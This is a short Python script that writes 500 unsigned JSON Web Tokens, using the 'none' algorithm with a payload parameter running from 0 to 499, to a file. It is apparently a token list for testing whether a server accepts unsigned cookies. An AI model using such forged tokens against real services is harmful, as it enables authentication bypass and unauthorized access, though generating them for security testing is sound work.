import jwt

UPPER_BOUND = 500
HEADERS = {"alg": "none", "typ": "JWT"}
PAYLOAD_PARAMETER = "param"

with open("generated_jwts.txt", "w") as f:
    for k in range(0, UPPER_BOUND):
        jwt_cookie = jwt.encode({PAYLOAD_PARAMETER: k}, None, headers=HEADERS)
        f.write(f"{jwt_cookie}\n")

